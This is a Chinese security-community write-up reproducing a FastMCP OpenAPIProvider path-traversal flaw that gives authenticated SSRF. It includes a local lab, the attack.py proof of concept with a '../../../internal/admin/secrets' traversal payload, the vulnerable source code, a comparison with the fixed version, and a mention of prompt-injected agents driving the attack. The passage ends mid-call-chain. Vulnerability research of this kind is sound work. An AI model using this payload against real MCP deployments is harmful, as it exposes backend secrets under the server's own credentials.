---
title: FastMCP OpenAPI 路径穿越到认证 SSRF 复现与分析
url: https://xz.aliyun.com/news/93344
source: 先知安全技术社区
date: 2026-11-16
fetch_date: 2026-11-17T09:50:24.315591
---

# FastMCP OpenAPI 路径穿越到认证 SSRF 复现与分析

[先知社区](/)[文章](/news)[视频](/course)[众测](/vuln)[赛事](/ctf)[技能](/skills)[墨白](/mobai)[活动](/events)[名人堂](/hof)[积分商城](/points-mall)

[写文章](/write)

有用收藏打赏分享

# FastMCP OpenAPI 路径穿越到认证 SSRF 复现与分析

[![](/images/default-avatar.png)SecurityPaper](/users/102159)·2026-11-16 15:06·10 分钟·117·江苏·AI专栏

本文分析FastMCP OpenAPIProvider路径穿越漏洞，攻击者通过注入../利用urljoin解析特性逃逸接口范围，实现携带鉴权头的SSRF。

本文复现并分析 FastMCP OpenAPIProvider 的一个路径穿越漏洞：它把 OpenAPI spec 里的接口自动变成
MCP 工具暴露给客户端，但拼后端 URL 时路径参数未做 URL 编码，又交给会解析 `../` 的 `urllib.parse.urljoin()`。
MCP 客户端在一个本该是 `user_id` 的参数里塞 `../`，就能逃出 spec 划定的接口范围，带着 provider
配好的鉴权头去请求后端任意路径——官方定性为认证上下文下的 SSRF。下面在本地起测试环境后端 + MCP 服务端，打通整条链，并对漏洞版 3.1.0 与修复版 3.2.0 做对比。

## 一、漏洞说明

Advisory 链接：<https://github.com/PrefectHQ/fastmcp/security/advisories/GHSA-vv7q-7jx5-f767>

FastMCP 的 `OpenAPIProvider` 用来把一份 OpenAPI spec 里声明的后端接口，自动生成成一批 MCP 工具，
交给 MCP 客户端（通常是大模型 / Agent）调用。负责拼最终请求的是 `RequestDirector` 类。问题出在它的
`_build_url()`：当接口带路径参数（如 `/api/v1/users/{user_id}`）时，它把参数值**直接**替换进模板
字符串，不做任何 URL 编码，随后用 `urllib.parse.urljoin()` 解析出最终 URL。

`urljoin()` 会把 `../` 当成目录上跳。于是一个控制了路径参数的攻击者，可以用路径穿越逃出 spec 本该
限定的接口前缀，去请求后端上任意接口。由于这些请求携带的是 provider 为后端配置的鉴权头
（如 `Authorization: Bearer ...`），攻击者等于拿着服务端的凭据去敲 spec 里根本没暴露的内部接口——
这就是认证上下文下的 SSRF。OpenAPIProvider 用"只暴露 spec 里那几个接口"来当安全边界，被一个 `../`
彻底绕过。

## 二、基本信息

|  |  |
| --- | --- |
| 公开时间 | 2026-03-31 |
| 编号 | GHSA-vv7q-7jx5-f767 |
| 威胁类型 | 路径穿越 → 认证 SSRF（CWE-918） |
| 严重度 | High |
| 利用条件 | 能驱动 OpenAPI 生成的 MCP 工具调用、控制路径参数 |

## 三、受影响版本

`fastmcp < 3.2.0`，`3.2.0` 修复。任何用 `OpenAPIProvider` / `FastMCP.from_openapi()` 把带路径参数的
后端接口暴露成 MCP 工具的部署都在范围内。

## 四、影响组件

FastMCP（PrefectHQ/fastmcp）是目前使用最广的 MCP（Model Context Protocol）Python 框架之一，`from_openapi`
是它把现成 REST 后端一键接入 MCP 的常用能力。MCP 则是连接大模型 / Agent 与外部工具、数据源的协议，
"把后端接口自动变成工具"正是 Agent 时代很常见的接入方式，这也让这类自动封装的信任边界问题影响面
不小。

## 五、利用条件

1. 服务端用 `OpenAPIProvider` / `FastMCP.from_openapi()` 暴露了**带路径参数**的接口（`/x/{id}` 形式）；
2. fastmcp 版本 `< 3.2.0`；
3. 攻击者能驱动这个 MCP 工具的调用——可以是直接连 MCP 服务端的客户端，也可以是一个被提示词注入
   带偏的大模型 / Agent；
4. provider 配置了对后端的鉴权（穿越后的请求会继承这份凭据，危害才完整）；
5. 后端上存在 spec 之外、值得一打的接口（内部管理、凭据、可写操作等）。

## 六、环境搭建

### 1、环境拓扑

```
本机 127.0.0.1
├── 后端服务 backend.py   (uvicorn, 127.0.0.1:8930)
│     ├── GET /api/v1/users/{user_id}     对外接口（会写进 OpenAPI spec）
│     └── GET /internal/admin/secrets     内部接口（不在 spec，需 Bearer 凭据）
└── attack.py             FastMCP.from_openapi(仅声明 users 接口) + MCP 客户端
      └── 出站 httpx 客户端带 Authorization: Bearer svc-internal-token
```

### 2、建两个隔离 venv（漏洞版 / 修复版）

库类漏洞用 venv 锁版本最轻、最稳：

```
python3 -m venv .venv-vuln
. .venv-vuln/bin/activate && pip install "fastmcp==3.1.0" fastapi uvicorn && deactivate

python3 -m venv .venv-fixed
. .venv-fixed/bin/activate && pip install "fastmcp==3.2.0" fastapi uvicorn && deactivate
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20261116151515-7899f238-e18d-1.png)

### 3、后端服务 `backend.py`

一个对外接口、一个带凭据的内部接口，模拟后端：

```
from fastapi import FastAPI, Header, HTTPException
import uvicorn

app = FastAPI()
ADMIN_TOKEN = "Bearer svc-internal-token"   # MCP provider 配给后端的凭据

@app.get("/api/v1/users/{user_id}")
def get_user(user_id: str):
    return {"endpoint": "public", "user_id": user_id}

@app.get("/internal/admin/secrets")
def admin_secrets(authorization: str = Header(default="")):
    if authorization != ADMIN_TOKEN:
        raise HTTPException(status_code=401, detail="unauthorized")
    return {"endpoint": "INTERNAL-ADMIN", "db_password": "p@ss", "api_keys": ["sk-xxx"]}

if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8930, log_level="warning")
```

### 4、MCP 服务端 + 客户端 `attack.py`

关键点：OpenAPI spec 里**只声明了对外的** `/api/v1/users/{user_id}`，内部接口不在其中；provider 的
出站客户端带着后端凭据。

```
import asyncio, httpx, fastmcp
from fastmcp import FastMCP, Client

BACKEND = "http://127.0.0.1:8930"
ADMIN_TOKEN = "Bearer svc-internal-token"

OPENAPI = {
    "openapi": "3.1.0", "info": {"title": "user-service", "version": "1.0"},
    "paths": {"/api/v1/users/{user_id}": {"get": {
        "operationId": "get_user",
        "parameters": [{"name": "user_id", "in": "path",
                        "required": True, "schema": {"type": "string"}}],
        "responses": {"200": {"description": "ok"}}}}},
}

async def main():
    client = httpx.AsyncClient(base_url=BACKEND, headers={"Authorization": ADMIN_TOKEN})
    mcp = FastMCP.from_openapi(openapi_spec=OPENAPI, client=client)
    async with Client(mcp) as c:
        for label, val in [("正常调用", "42"),
                           ("穿越", "../../../internal/admin/secrets")]:
            res = await c.call_tool("get_user", {"user_id": val})
            print(label, val, "->", res.data)
    await client.aclose()

asyncio.run(main())
```

### 5、启动后端并验证

```
. .venv-vuln/bin/activate && python3 backend.py &   # 后台起后端
sleep 2
curl -s http://127.0.0.1:8930/api/v1/users/42
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:8930/internal/admin/secrets      # 无凭据
curl -s -H "Authorization: Bearer svc-internal-token" http://127.0.0.1:8930/internal/admin/secrets
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20261116151516-78e89427-e18d-1.png)

输出：

```
{"endpoint":"public","user_id":"42"}
401
{"endpoint":"INTERNAL-ADMIN","db_password":"p@ss","api_keys":["sk-xxx"]}
```

对外接口正常；内部接口没凭据是 401，带对凭据能拿到敏感数据。环境就绪。

## 七、漏洞复现

### 1、漏洞版 3.1.0

后端跑着，在 `.venv-vuln` 里执行 `attack.py`：

![](https://xzfile.aliyuncs.com/media/upload/picture/20261116151516-792866ca-e18d-1.png)

正常参数只能摸到对外的 users 接口。而一个 `user_id='../../../internal/admin/secrets'`，就让服务端
带着 `Authorization: Bearer svc-internal-token` 去请求了 spec 里根本没暴露的 `/internal/admin/secrets`，
把数据库密码、API key 原样拿了回来。

### 2、修复版 3.2.0 对比

同样的后端、同样的 `attack.py`，只换到 `.venv-fixed`：

![](https://xzfile.aliyuncs.com/media/upload/picture/20261116151517-79817581-e18d-1.png)

穿越被挡下：`../` 被编码，请求老实落在 `/api/v1/users/%2E%2E%2F...`，后端没有这个路径，返回 404。

## 八、漏洞分析

### 1、拼 URL 的地方

漏洞代码在 `fastmcp/utilities/openapi/director.py`（3.1.0）：

```
  4  from urllib.parse import urljoin
...
194  def _build_url(
195      self, path_template: str, path_params: dict[str, Any], base_url: str
196  ) -> str:
...
209      url_path = path_template
210      for param_name, param_value in path_params.items():
211          placeholder = f"{{{param_name}}}"
212          if placeholder in url_path:
213              url_path = url_path.replace(placeholder, str(param_value))   # 直接替换，不编码
214
215      # Combine with base URL
216      return urljoin(base_url.rstrip("/") + "/", url_path.lstrip("/"))
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20261116151517-79d8e9de-e18d-1.png)

第 213 行 `str(param_value)` 原样替换进模板，`/`、`.`、`?` 这些对 URL 有特殊含义的字符全被当普通
文本塞进去。第 216 行把结果交给 `urljoin`。

### 2、为什么 `urljoin` 会穿

`urljoin` 的语义是"把右边当相对引用，在 base 上解析"，相对引用里的 `../` 就是上跳一级。单独把这一步
拎出来算给自己看，用 `_build_url`（它不依赖实例状态，`object.__new__` 构造即可）：

```
from fastmcp.utilities.openapi.director import RequestDirector
d = object.__new__(RequestDirector)
base = "http://127.0.0.1:8930/"
tmpl = "/api/v1/users/{user_id}"
for v in ("42", "../../../internal/admin/secrets"):
    print(v, "->", d._build_url(tmpl, {"user_id": v}, base))
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20261116151518-7a192fe8-e18d-1.png)

`/api/v1/users/../../../internal/admin/secrets` 被 `urljoin` 从 `users/` 依次上跳 `users`、`v1`、`api`
三级到 host 根，再进 `internal/admin/secrets`，于是逃出了整个 `/api/v1/` 前缀。穿越爬几级，取决于
模板里参数前有几段路径。

![](https://xzfile.aliyuncs.com/media/upload/picture/20261116151518-7a609857-e18d-1.png)

### 3、拼出来的 URL 直接发出去

确认这个字符串不是算完就扔，`director.py` 的 `build_request` 里：

![](https://xzfile.aliyuncs.com/media/upload/picture/20261116151519-7ab7cd28-e18d-1.png)

第 54 行拼出 URL，第 71–73 行直接拿它构造 `httpx.Request`，中间没有再做规范化或校验。第七节那次打到
`/internal/admin/secrets` 的出站请求，就是从这里发出去的。

### 4、根因

一句话：**路径参数未编码直接拼进模板（director.py:213），又用了会解析** `../` **的** `urljoin` **（director.py:216），两步一凑，MCP 客户端就能用一个** `../` **逃出 spec 划定的接口范围。** OpenAPIProvider
想用"只暴露 spec 里的接口"当白名单，这个白名单因此作废。

### 5、调用链

```
MCP 客户端 call_tool("get_user", {user_id: "../../../internal/admin/s...